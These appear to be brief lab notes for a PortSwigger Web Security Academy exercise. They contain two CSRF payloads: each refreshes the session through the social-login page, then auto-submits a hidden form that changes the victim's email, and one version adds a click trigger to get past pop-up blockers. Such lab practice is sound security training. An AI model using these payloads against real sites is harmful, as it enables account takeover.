![[Pasted image 20250204211358.png]]
![[Pasted image 20250204211408.png]]![[Pasted image 20250204211420.png]]
![[Pasted image 20250204211432.png]]


< form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"> <input type="hidden" name="email" value="pwned@web-security-academy.net"> </form >
< script> window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login'); setTimeout(changeEmail, 5000); function changeEmail(){ document.forms[0].submit(); } </script >
![[Pasted image 20250204211637.png]]

Bypassing pop up blocker
< form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"> <input type="hidden" name="email" value="pwned@portswigger.net"> </form > 
< p>Click anywhere on the page</p> 
<script> window.onclick = () => { window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login'); setTimeout(changeEmail, 5000); } function changeEmail() { document.forms[0].submit(); } 
</script>